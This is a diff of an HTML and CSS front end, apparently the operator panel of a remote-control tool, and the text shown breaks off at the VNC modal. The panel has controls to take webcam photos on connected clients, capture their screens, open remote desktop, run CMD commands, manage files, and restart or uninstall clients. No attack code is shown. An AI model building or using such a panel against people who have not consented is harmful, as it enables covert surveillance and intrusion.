@@ -3,323 +3,552 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>远程摄像头控制</title>
+    <title>远程控制系统</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         :root {
-            --primary-color: #4285f4;
-            --secondary-color: #34a853;
-            --warning-color: #fbbc05;
-            --error-color: #ea4335;
-            --dark-color: #333;
-            --light-color: #f5f5f5;
-            --white-color: #ffffff;
-            --gray-color: #f0f0f0;
-            --text-color: #333;
-            --text-secondary: #666;
-            --border-radius: 8px;
-            --box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            --transition: all 0.2s ease;
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --primary-light: #e0e7ff;
+            --secondary: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --dark: #1f2937;
+            --gray: #6b7280;
+            --light-gray: #f3f4f6;
+            --border: #e5e7eb;
+            --card-bg: #ffffff;
+            --bg: #f9fafb;
+            --text: #111827;
+            --text-secondary: #6b7280;
+            --shadow: 0 1px 3px rgba(0,0,0,0.1), 0 1px 2px rgba(0,0,0,0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05);
+            --radius: 12px;
+            --radius-sm: 8px;
+            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
         }
-        
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--light-color);
-            color: var(--text-color);
-            line-height: 1.6;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: var(--text);
+            padding: 20px;
         }
-        
+
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
-            padding: 16px;
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
         }
-        
+
+        /* Header */
         header {
-            background-color: var(--primary-color);
-            color: var(--white-color);
-            padding: 16px;
-            border-radius: var(--border-radius);
-            margin-bottom: 16px;
-            box-shadow: var(--box-shadow);
-        }
-        
-        h1 {
-            font-size: 24px;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-        
-        .status {
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .status.online {
-            color: var(--secondary-color);
-        }
-        
-        .status.offline {
-            color: var(--error-color);
-        }
-        
-        .main-content {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-            margin-bottom: 16px;
-        }
-        
-        @media (max-width: 768px) {
-            .main-content {
-                grid-template-columns: 1fr;
-                gap: 12px;
-            }
-            
-            .container {
-                padding: 12px;
-            }
-            
-            header {
-                padding: 12px;
-            }
-            
-            h1 {
-                font-size: 20px;
-            }
-            
-            h2 {
-                font-size: 16px;
-            }
-            
-            .card {
-                padding: 12px;
-            }
-            
-            .btn-lg {
-                padding: 10px 20px;
-                font-size: 14px;
-            }
-            
-            .btn-md {
-                padding: 8px 16px;
-                font-size: 13px;
-            }
-            
-            .btn-sm {
-                padding: 6px 12px;
-                font-size: 12px;
-            }
-            
-            /* 确保触摸目标足够大 */
-            button, input, select {
-                min-height: 44px;
-                min-width: 44px;
-            }
-            
-            /* 控制面板在移动端的调整 */
-            .control-section {
-                text-align: left;
-            }
-            
-            /* 表格在移动端的调整 */
-            table {
-                font-size: 12px;
-            }
-            
-            th, td {
-                padding: 8px;
-            }
-            
-            /* 远程命令执行在移动端的调整 */
-            #commandOutput {
-                height: 150px;
-            }
-            
-            /* VNC控制按钮在移动端的调整 */
-            .vnc-controls {
-                bottom: 10px;
-                right: 10px;
-            }
-            
-            .vnc-control-btn {
-                padding: 6px 10px;
-                font-size: 12px;
-            }
-        }
-        
-        .card {
-            background-color: var(--white-color);
-            padding: 16px;
-            border-radius: var(--border-radius);
-            box-shadow: var(--box-shadow);
-            transition: var(--transition);
-        }
-        
-        .card:hover {
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-        }
-        
-        h2 {
-            font-size: 18px;
-            margin-bottom: 12px;
-            color: var(--primary-color);
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .control-section {
-            text-align: center;
-        }
-        
-        .btn {
-            border: none;
-            border-radius: var(--border-radius);
-            cursor: pointer;
-            transition: var(--transition);
-            font-weight: 500;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        
-        .btn-primary {
-            background-color: var(--primary-color);
-            color: var(--white-color);
-        }
-        
-        .btn-primary:hover {
-            background-color: #3367d6;
-            transform: translateY(-1px);
-        }
-        
-        .btn-secondary {
-            background-color: var(--secondary-color);
-            color: var(--white-color);
-        }
-        
-        .btn-secondary:hover {
-            background-color: #2d8c46;
-            transform: translateY(-1px);
-        }
-        
-        .btn-warning {
-            background-color: var(--warning-color);
-            color: var(--dark-color);
-        }
-        
-        .btn-warning:hover {
-            background-color: #f59e0b;
-            transform: translateY(-1px);
-        }
-        
-        .btn-danger {
-            background-color: var(--error-color);
-            color: var(--white-color);
-        }
-        
-        .btn-danger:hover {
-            background-color: #d93025;
-            transform: translateY(-1px);
-        }
-        
-        .btn-lg {
-            padding: 12px 24px;
-            font-size: 16px;
-        }
-        
-        .btn-md {
-            padding: 10px 20px;
-            font-size: 14px;
-        }
-        
-        .btn-sm {
-            padding: 8px 16px;
-            font-size: 14px;
-        }
-        
-        .btn:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        
-        .clients-list {
-            margin-top: 12px;
-        }
-        
-        .client-item {
-            background-color: var(--gray-color);
-            padding: 8px 12px;
-            border-radius: 6px;
-            margin-bottom: 6px;
-            font-size: 14px;
-            transition: var(--transition);
-        }
-        
-        .client-item:hover {
-            background-color: #e0e0e0;
-        }
-        
-        .photos-section {
-            grid-column: 1 / -1;
-        }
-        
-        #photosList {
-            margin-top: 12px;
-        }
-        
-        .photo-item {
-            background-color: var(--gray-color);
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 8px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 24px 32px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            transition: var(--transition);
         }
-        
-        .photo-item:hover {
-            background-color: #e0e0e0;
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
         }
-        
-        .photo-info {
-            flex: 1;
+
+        .header-icon {
+            font-size: 32px;
         }
-        
-        .photo-name {
-            font-weight: 600;
-            margin-bottom: 4px;
+
+        header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
             font-size: 14px;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
         }
-        
-        .photo-meta {
-            font-size: 12px;
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ef4444;
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.online {
+            background: #22c55e;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid var(--border);
+            background: var(--light-gray);
+            padding: 0 32px;
+        }
+
+        .tab {
+            padding: 16px 24px;
+            cursor: pointer;
+            font-weight: 500;
             color: var(--text-secondary);
+            border: none;
+            background: none;
+            position: relative;
+            transition: var(--transition);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        
-        .count-badge {
-            background-color: var(--secondary-color);
-            color: var(--white-color);
-            padding: 2px 8px;
-            border-radius: 10px;
-            font-size: 12px;
-            margin-left: 8px;
+
+        .tab:hover {
+            color: var(--primary);
+            background: var(--primary-light);
+        }
+
+        .tab.active {
+            color: var(--primary);
+        }
+
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--primary);
+            border-radius: 3px 3px 0 0;
+        }
+
+        /* Tab Content */
+        .tab-content {
+            display: none;
+            padding: 32px;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Cards */
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow);
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--dark);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            font-weight: 500;
+            font-size: 14px;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-1px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .btn-secondary {
+            background: var(--secondary);
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: #059669;
+        }
+
+        .btn-warning {
+            background: var(--warning);
+            color: white;
+        }
+
+        .btn-warning:hover {
+            background: #d97706;
+        }
+
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #dc2626;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .btn-sm {
+            padding: 6px 12px;
+            font-size: 13px;
+        }
+
+        .btn-lg {
+            padding: 14px 28px;
+            font-size: 16px;
+        }
+
+        /* Form */
+        input[type="text"], select {
+            padding: 10px 14px;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-size: 14px;
+            transition: var(--transition);
+            width: 100%;
+        }
+
+        input[type="text"]:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99,102,241,0.1);
+        }
+
+        /* Messages */
+        .message {
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            margin-bottom: 16px;
+            font-size: 14px;
             font-weight: 500;
         }
-        
-        /* VNC Modal 样式 */
-        .vnc-modal {
+
+        .message.success {
+            background: #d1fae5;
+            color: #065f46;
+        }
+
+        .message.error {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+
+        .message.info {
+            background: #dbeafe;
+            color: #1e40af;
+        }
+
+        /* Grid */
+        .grid {
+            display: grid;
+            gap: 20px;
+        }
+
+        .grid-2 {
+            grid-template-columns: repeat(2, 1fr);
+        }
+
+        @media (max-width: 768px) {
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Client Selector */
+        .client-selector {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 16px;
+            background: var(--light-gray);
+            border-radius: var(--radius-sm);
+        }
+
+        .client-selector label {
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .client-selector select {
+            flex: 1;
+            max-width: 300px;
+        }
+
+        /* Action Buttons Grid */
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        /* Command Output */
+        .code-output {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 16px;
+            border-radius: var(--radius-sm);
+            font-family: 'SF Mono', 'Monaco', 'Inconsolata', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        /* File Manager */
+        .file-manager {
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+        }
+
+        .file-breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 16px;
+            background: var(--light-gray);
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap;
+        }
+
+        .breadcrumb-item {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: var(--transition);
+        }
+
+        .breadcrumb-item:hover {
+            background: var(--primary-light);
+            color: var(--primary);
+        }
+
+        .breadcrumb-separator {
+            color: var(--text-secondary);
+        }
+
+        .file-toolbar {
+            display: flex;
+            gap: 12px;
+            padding: 16px;
+            border-bottom: 1px solid var(--border);
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .file-toolbar input {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .file-table-container {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        thead {
+            background: var(--light-gray);
+        }
+
+        th, td {
+            padding: 14px 16px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        th {
+            font-weight: 600;
+            font-size: 13px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        tr {
+            transition: var(--transition);
+        }
+
+        tbody tr:hover {
+            background: var(--light-gray);
+        }
+
+        .file-row {
+            cursor: pointer;
+        }
+
+        .file-row.dir:hover {
+            background: var(--primary-light);
+        }
+
+        .file-icon {
+            font-size: 20px;
+            margin-right: 8px;
+        }
+
+        .file-name {
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+        }
+
+        .file-size {
+            color: var(--text-secondary);
+        }
+
+        /* Photos */
+        .photos-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .photo-card {
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            transition: var(--transition);
+        }
+
+        .photo-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .photo-preview {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            background: var(--light-gray);
+        }
+
+        .photo-info {
+            padding: 16px;
+        }
+
+        .photo-name {
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .photo-meta {
+            color: var(--text-secondary);
+            font-size: 13px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Clients List */
+        .clients-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 16px;
+        }
+
+        .client-card {
+            padding: 20px;
+            border: 2px solid var(--border);
+            border-radius: var(--radius);
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            transition: var(--transition);
+        }
+
+        .client-card:hover {
+            border-color: var(--primary);
+        }
+
+        .client-avatar {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+
+        .client-info {
+            flex: 1;
+        }
+
+        .client-id {
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .client-status {
+            color: var(--secondary);
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        /* VNC Modal */
+        .modal {
             display: none;
             position: fixed;
             z-index: 1000;
@@ -327,247 +556,213 @@
             top: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0,0,0,0.95);
-            overflow: hidden;
+            background: rgba(0,0,0,0.9);
         }
-        
-        .vnc-header {
-            padding: 12px 16px;
-            background-color: var(--dark-color);
-            color: var(--white-color);
+
+        .modal.active {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            padding: 16px 24px;
+            background: #1f2937;
+            color: white;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #444;
         }
-        
-        .vnc-header h3 {
-            font-size: 16px;
+
+        .modal-title {
             font-weight: 600;
-            margin: 0;
         }
-        
-        .vnc-header-right {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .vnc-status {
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        
-        .vnc-status-indicator {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background-color: #4caf50;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        
-        .vnc-content {
+
+        .modal-content {
+            flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: calc(100% - 56px);
+            padding: 20px;
             overflow: auto;
-            position: relative;
         }
-        
+
         #vncScreen {
             max-width: 100%;
             max-height: 100%;
             cursor: crosshair;
-            user-select: none;
-            -webkit-user-drag: none;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 0 40px rgba(0,0,0,0.5);
+            border-radius: 8px;
         }
-        
+
         .vnc-controls {
-            position: absolute;
-            bottom: 20px;
-            right: 20px;
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
             display: flex;
             gap: 8px;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 8px;
-            border-radius: 6px;
         }
-        
-        .vnc-control-btn {
-            background-color: rgba(255, 255, 255, 0.2);
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: var(--transition);
-        }
-        
-        .vnc-control-btn:hover {
-            background-color: rgba(255, 255, 255, 0.3);
-        }
-        
-        /* 加载动画 */
+
+        /* Loading */
         .loading {
             display: inline-block;
             width: 16px;
             height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
             border-radius: 50%;
-            border-top-color: var(--white-color);
-            animation: spin 1s ease-in-out infinite;
-            vertical-align: middle;
+            animation: spin 0.8s linear infinite;
         }
-        
+
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        
-        /* 消息提示 */
-        .message {
-            padding: 10px 12px;
-            border-radius: 6px;
-            margin-bottom: 12px;
-            font-weight: 500;
-            font-size: 14px;
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--text-secondary);
         }
-        
-        .message.success {
-            background-color: #d4edda;
-            color: #155724;
+
+        .empty-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
         }
-        
-        .message.error {
-            background-color: #f8d7da;
-            color: #721c24;
-        }
-        
-        .message.info {
-            background-color: #d1ecf1;
-            color: #0c5460;
-        }
-        
-        /* 表单元素 */
-        input[type="text"],
-        select {
-            padding: 8px 12px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 14px;
-            transition: var(--transition);
-        }
-        
-        input[type="text"]:focus,
-        select:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
-        }
-        
-        /* 表格样式 */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            text-align: left;
-        }
-        
-        th {
-            padding: 10px;
-            border-bottom: 2px solid var(--gray-color);
-            background-color: var(--gray-color);
+
+        .empty-title {
+            font-size: 18px;
             font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text);
+        }
+
+        .empty-desc {
             font-size: 14px;
         }
-        
-        td {
-            padding: 10px;
-            border-bottom: 1px solid #eee;
-            font-size: 14px;
-        }
-        
-        tr:hover {
-            background-color: rgba(66, 133, 244, 0.05);
+
+        /* Count Badge */
+        .count-badge {
+            background: var(--primary);
+            color: white;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>📷 远程摄像头控制</h1>
-            <div class="status">
-                <span id="serverStatus" class="offline">服务器状态：离线</span>
+            <div class="header-left">
+                <span class="header-icon">🖥️</span>
+                <h1>远程控制系统</h1>
+            </div>
+            <div class="status-badge">
+                <span id="statusDot" class="status-dot"></span>
+                <span id="serverStatus">服务器离线</span>
             </div>
         </header>
-        
-        <div class="main-content">
-            <div class="card control-section">
-                <h2>🎯 控制面板</h2>
-                <div style="margin-bottom: 16px; padding: 12px; background-color: var(--gray-color); border-radius: 6px;">
-                    <div style="font-size: 14px; font-weight: 500; margin-bottom: 8px;">目标客户端</div>
-                    <select id="targetClient" style="width: 100%; max-width: 300px;">
-                        <option value="all">所有客户端</option>
-                    </select>
-                </div>
-                
-                <div style="margin-bottom: 16px;">
-                    <div style="font-size: 14px; font-weight: 500; margin-bottom: 8px; text-align: left;">核心功能</div>
-                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px;">
-                        <button id="shootBtn" disabled class="btn btn-danger btn-lg">📷 拍摄照片</button>
-                        <button id="screenshotBtn" disabled class="btn btn-warning btn-lg">🖥️ 抓取屏幕</button>
-                        <button id="vncBtn" disabled class="btn btn-primary btn-lg">🖱️ 远程桌面</button>
-                    </div>
-                </div>
-                
-                <div>
-                    <div style="font-size: 14px; font-weight: 500; margin-bottom: 8px; text-align: left;">客户端管理</div>
-                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 8px;">
-                        <button id="restartBtn" disabled class="btn btn-primary btn-md">🔄 重启</button>
-                        <button id="stopBtn" disabled class="btn btn-warning btn-md">⏹️ 停止</button>
-                        <button id="uninstallBtn" disabled class="btn btn-danger btn-md">🗑️ 卸载</button>
-                    </div>
-                </div>
-                
-                <div id="controlMessage" style="margin-top: 12px;"></div>
-            </div>
-            
-            <div class="card">
-                <h2>💻 远程命令执行</h2>
-                <div style="display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap;">
-                    <input type="text" id="commandInput" placeholder="输入CMD命令 (如 dir, ipconfig)" style="flex: 1; min-width: 200px;">
-                    <button id="executeBtn" class="btn btn-primary btn-md">执行</button>
-                </div>
-                <pre id="commandOutput" style="background-color: #1e1e1e; color: #00ff00; padding: 12px; border-radius: 6px; height: 180px; overflow-y: auto; font-family: monospace; white-space: pre-wrap; margin-top: 10px; font-size: 13px;"></pre>
+
+        <div class="tabs">
+            <button class="tab active" data-tab="dashboard">
+                <span>🎯</span> 控制中心
+            </button>
+            <button class="tab" data-tab="files">
+                <span>📁</span> 文件管理
+            </button>
+            <button class="tab" data-tab="photos">
+                <span>🖼️</span> 照片截图
+            </button>
+            <button class="tab" data-tab="clients">
+                <span>👥</span> 客户端
+            </button>
+        </div>
+
+        <!-- Dashboard Tab -->
+        <div class="tab-content active" id="dashboard-tab">
+            <div class="client-selector">
+                <label for="targetClient">目标客户端:</label>
+                <select id="targetClient">
+                    <option value="all">所有客户端</option>
+                </select>
             </div>
 
-            <div class="card" style="grid-column: 1 / -1;">
-                <h2>📁 远程文件管理</h2>
-                
-                <!-- 面包屑导航 -->
-                <div id="breadcrumb" style="margin-bottom: 12px; font-size: 14px; color: var(--text-secondary);">
-                    当前路径: <span id="currentPathDisplay">未选择</span>
+            <div class="grid grid-2">
+                <div class="card">
+                    <div class="card-title">
+                        <span>📷</span> 核心控制
+                    </div>
+                    <div class="action-grid">
+                        <button id="shootBtn" disabled class="btn btn-danger btn-lg">
+                            📷 拍摄照片
+                        </button>
+                        <button id="screenshotBtn" disabled class="btn btn-warning btn-lg">
+                            🖥️ 抓取屏幕
+                        </button>
+                        <button id="vncBtn" disabled class="btn btn-primary btn-lg">
+                            🖱️ 远程桌面
+                        </button>
+                    </div>
+                    <div id="controlMessage" style="margin-top: 16px;"></div>
                 </div>
-                
-                <div style="display: flex; gap: 8px; margin-bottom: 12px; align-items: center; flex-wrap: wrap;">
-                    <input type="text" id="dirPathInput" placeholder="输入绝对路径 (如 C:\Users)" style="flex: 1; min-width: 200px;">
-                    <button id="listDirBtn" class="btn btn-primary btn-md">📂 列出目录</button>
+
+                <div class="card">
+                    <div class="card-title">
+                        <span>⚙️</span> 客户端管理
+                    </div>
+                    <div class="action-grid">
+                        <button id="restartBtn" disabled class="btn btn-primary btn-lg">
+                            🔄 重启
+                        </button>
+                        <button id="stopBtn" disabled class="btn btn-warning btn-lg">
+                            ⏹️ 停止
+                        </button>
+                        <button id="uninstallBtn" disabled class="btn btn-danger btn-lg">
+                            🗑️ 卸载
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">
+                    <span>💻</span> 远程命令执行
+                </div>
+                <div style="display: flex; gap: 12px; margin-bottom: 16px; flex-wrap: wrap;">
+                    <input type="text" id="commandInput" placeholder="输入CMD命令 (如 dir, ipconfig)" style="flex: 1; min-width: 200px;">
+                    <button id="executeBtn" disabled class="btn btn-primary">执行</button>
+                </div>
+                <div id="commandOutput" class="code-output">等待命令...</div>
+            </div>
+        </div>
+
+        <!-- Files Tab -->
+        <div class="tab-content" id="files-tab">
+            <div class="client-selector">
+                <label for="fileTargetClient">目标客户端:</label>
+                <select id="fileTargetClient">
+                    <option value="all">选择客户端...</option>
+                </select>
+            </div>
+
+            <div class="file-manager">
+                <div class="file-breadcrumb" id="breadcrumb">
+                    <span class="breadcrumb-item" data-path="">📂 根目录</span>
+                </div>
+                <div class="file-toolbar">
+                    <input type="text" id="dirPathInput" placeholder="输入绝对路径 (如 C:\Users)">
+                    <button id="listDirBtn" class="btn btn-primary">
+                        📂 列出目录
+                    </button>
                     <input type="file" id="fileUploadInput" style="display: none;">
-                    <button id="uploadFileBtn" class="btn btn-secondary btn-md">📤 上传文件</button>
-                    <div id="fileMessage" style="margin-left: 10px; font-weight: 500; font-size: 14px;"></div>
+                    <button id="uploadFileBtn" class="btn btn-secondary">
+                        📤 上传文件
+                    </button>
+                    <span id="fileMessage"></span>
                 </div>
-                
-                <div style="overflow-x: auto; border: 1px solid #eee; border-radius: 6px;">
-                    <table style="width: 100%; border-collapse: collapse; text-align: left;">
+                <div class="file-table-container">
+                    <table>
                         <thead>
                             <tr>
                                 <th>名称</th>
@@ -578,229 +773,350 @@
                             </tr>
                         </thead>
                         <tbody id="fileListBody">
-                            <tr><td colspan="5" style="text-align: center; padding: 20px; color: var(--text-secondary); font-style: italic;">请输入路径并点击"列出目录"</td></tr>
+                            <tr>
+                                <td colspan="5">
+                                    <div class="empty-state">
+                                        <div class="empty-icon">📂</div>
+                                        <div class="empty-title">选择客户端并浏览文件</div>
+                                        <div class="empty-desc">选择目标客户端，然后点击列出目录开始浏览</div>
+                                    </div>
+                                </td>
+                            </tr>
                         </tbody>
                     </table>
                 </div>
             </div>
+        </div>
 
-            <div class="card">
-                <h2>👥 在线客户端 <span id="clientsCount" class="count-badge">0</span></h2>
-                <div class="clients-list">
-                    <div id="clientsList">
-                        <div style="text-align: center; padding: 20px; color: var(--text-secondary); font-style: italic; background-color: var(--gray-color); border-radius: 6px;">
-                            📱 暂无在线客户端
-                        </div>
-                    </div>
+        <!-- Photos Tab -->
+        <div class="tab-content" id="photos-tab">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
+                <div class="card-title" style="margin-bottom: 0;">
+                    <span>🖼️</span> 照片列表
+                    <span id="photosCount" class="count-badge" style="margin-left: 8px;">0</span>
                 </div>
-                <div style="margin-top: 12px; padding: 10px; background-color: var(--gray-color); border-radius: 6px; font-size: 14px;">
-                    <strong>提示：</strong> 客户端上线后会自动显示在这里，您可以在控制面板中选择目标客户端进行操作。
+                <button id="refreshPhotosBtn" class="btn btn-primary">
+                    🔄 刷新
+                </button>
+            </div>
+            <div id="photosGrid" class="photos-grid">
+                <div style="grid-column: 1 / -1;">
+                    <div class="empty-state">
+                        <div class="empty-icon">📷</div>
+                        <div class="empty-title">暂无照片</div>
+                        <div class="empty-desc">拍摄照片或抓取屏幕后，照片会显示在这里</div>
+                    </div>
                 </div>
             </div>
-            
-            <div class="card photos-section">
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; flex-wrap: wrap; gap: 8px;">
-                    <h2>🖼️ 照片列表 <span id="photosCount" class="count-badge">0</span></h2>
-                    <button id="refreshBtn" class="btn btn-primary btn-md">🔄 刷新列表</button>
+        </div>
+
+        <!-- Clients Tab -->
+        <div class="tab-content" id="clients-tab">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
+                <div class="card-title" style="margin-bottom: 0;">
+                    <span>👥</span> 在线客户端
+                    <span id="clientsCount" class="count-badge" style="margin-left: 8px;">0</span>
                 </div>
-                <div id="photosList">
-                    <div style="text-align: center; padding: 30px; color: var(--text-secondary); font-style: italic; background-color: var(--gray-color); border-radius: 6px;">
-                        📷 暂无照片
+            </div>
+            <div id="clientsGrid" class="clients-grid">
+                <div style="grid-column: 1 / -1;">
+                    <div class="empty-state">
+                        <div class="empty-icon">📱</div>
+                        <div class="empty-title">暂无在线客户端</div>
+                        <div class="empty-desc">等待客户端连接...</div>
                     </div>
-                </div>
-                <div style="margin-top: 12px; padding: 10px; background-color: var(--gray-color); border-radius: 6px; font-size: 14px;">
-                    <strong>提示：</strong> 拍摄照片或抓取屏幕后，照片会自动添加到列表中，您可以点击下载按钮保存到本地。
                 </div>
             </div>
         </div>
     </div>
 
     <!-- VNC Modal -->
-    <div id="vncModal" class="vnc-modal">
-        <div class="vnc-header">
-            <h3>远程桌面 (VNC) - 目标: <span id="vncTargetLabel"></span></h3>
-            <div class="vnc-header-right">
-                <div class="vnc-status">
-                    <div class="vnc-status-indicator"></div>
-                    <span id="vncStatus">正在接收画面...</span>
+    <div class="modal" id="vncModal">
